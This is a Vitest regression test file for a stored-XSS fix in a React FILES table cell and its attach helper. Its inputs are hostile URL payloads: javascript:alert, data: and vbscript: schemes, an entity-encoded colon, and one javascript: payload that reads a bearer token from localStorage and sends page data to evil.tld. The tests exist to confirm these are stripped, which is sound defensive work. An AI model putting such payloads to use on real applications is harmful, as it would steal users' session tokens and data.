import { describe, expect, it } from "vitest";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import type { PropertyType } from "@prisma/client";
import { Cell, composeFilesValue } from "./view-parts";
import type { DBProperty } from "@/components/database/database-types";

/**
 * B52 - stored XSS: a FILES property value is a free-form JSON object, and
 * `setPropertyValueAction` stores whatever it is given. The cell rendered
 * `entry.url` straight into an anchor `href`, so a stored `javascript:` URL
 * became a clickable link that ran in the app's origin for every member who
 * opened the table.
 *
 * These are render-level tests: the cell is rendered with a hostile stored
 * value and the produced markup is inspected. The allowlist helper alone
 * would not prove the link is gone.
 */

const property = {
  id: "p1",
  name: "Files",
  type: "FILES" as PropertyType,
  config: null,
} as DBProperty;

const render = (value: unknown) =>
  renderToStaticMarkup(
    createElement(Cell, {
      property,
      value,
      editable: false,
      onChange: () => {},
      locale: "en",
    }),
  );

describe("FILES cell - the stored file URL never becomes a javascript: href", () => {
  it("renders an app-owned file link", () => {
    const html = render({
      files: [{ name: "Q3 Report.pdf", url: "/api/files/ws1/q3-report.pdf" }],
    });
    expect(html).toContain('href="/api/files/ws1/q3-report.pdf"');
    expect(html).toContain("Q3 Report.pdf");
  });

  it("drops a stored javascript: URL", () => {
    const html = render({
      files: [{ name: "Q3 Report", url: "javascript:alert(document.domain)" }],
    });
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("<a");
  });

  it("drops the exfiltration payload from the finding", () => {
    const html = render({
      files: [
        {
          name: "Q3 Report",
          url:
            'javascript:fetch("/api/v1/pages",{headers:{Authorization:"Bearer "+localStorage.getItem("t")}}).then(r=>r.text()).then(t=>fetch("https://evil.tld/?d="+btoa(t)))',
        },
      ],
    });
    expect(html).not.toContain("javascript:");
    expect(html).not.toContain("evil.tld");
    expect(html).not.toContain("<a");
  });

  it("keeps the safe siblings of a hostile entry", () => {
    const html = render({
      files: [
        { name: "ok.pdf", url: "/api/files/ws1/ok.pdf" },
        { name: "bad", url: "javascript:alert(1)" },
        { name: "ok2.png", url: "/api/files/ws1/ok2.png" },
      ],
    });
    expect(html).not.toContain("javascript:");
    expect(html).toContain('href="/api/files/ws1/ok.pdf"');
    expect(html).toContain('href="/api/files/ws1/ok2.png"');
    expect(html).not.toContain("bad");
  });

  it("drops the other script-bearing schemes too", () => {
    for (const url of [
      "data:text/html;base64,PHN2Zz4=",
      "vbscript:msgbox(1)",
      "//evil.example/x",
    ]) {
      const html = render({ files: [{ name: "x", url }] });
      expect(html, url).not.toContain("<a");
    }
  });

  it("survives a hostile value shape without crashing the table", () => {
    expect(() => render({ files: "javascript:alert(1)" })).not.toThrow();
    expect(() => render({ files: [{ name: "x" }] })).not.toThrow();
  });

  /**
   * B52 (round 2, finding L3) — an HTML entity can hide the colon that
   * declares a scheme (`javascript&colon;alert(1)`). The shared href
   * allowlist does not decode entities, so the value survives it. It is
   * inert all the same: React escapes the `&` of an attribute value, and a
   * browser decodes an attribute value exactly once — what reaches the
   * browser is `javascript&colon;alert(1)`, a relative path, not a scheme.
   * This test pins that reasoning for the React path.
   */
  it("keeps an entity-encoded colon inert", () => {
    const html = render({ files: [{ name: "x", url: "javascript&colon;alert(1)" }] });
    const href = /href="([^"]*)"/.exec(html)?.[1] ?? null;
    if (href !== null) {
      // Decode the attribute value exactly once, the way a browser does.
      const decoded = href.replace(/&(#x[0-9a-f]+|#\d+|amp|lt|gt|quot|apos);/gi, (m, entity: string) =>
        entity.toLowerCase() === "amp" ? "&" : m,
      );
      expect(/^([A-Za-z][A-Za-z0-9+.-]*):/.exec(decoded)).toBeNull();
    }
  });
});

describe("composeFilesValue - the attach flow never proposes a foreign URL", () => {
  const asset = { name: "new.pdf", url: "/api/files/ws1/new.pdf" };

  it("keeps the app-owned entries and appends the new asset", () => {
    expect(
      composeFilesValue([{ name: "old.pdf", url: "/api/files/ws1/old.pdf" }], asset),
    ).toEqual({
      files: [{ name: "old.pdf", url: "/api/files/ws1/old.pdf" }, asset],
    });
  });

  it("drops an entry whose URL is not an app-owned asset path", () => {
    const value = composeFilesValue(
      [
        { name: "old.pdf", url: "/api/files/ws1/old.pdf" },
        { name: "hostile", url: "javascript:alert(1)" },
        { name: "external", url: "https://evil.example/x.pdf" },
      ],
      asset,
    );
    expect(value.files).toEqual([
      { name: "old.pdf", url: "/api/files/ws1/old.pdf" },
      asset,
    ]);
  });

  it("survives a hostile stored shape", () => {
    expect(composeFilesValue("javascript:alert(1)", asset)).toEqual({ files: [asset] });
    expect(composeFilesValue(undefined, asset)).toEqual({ files: [asset] });
  });
});
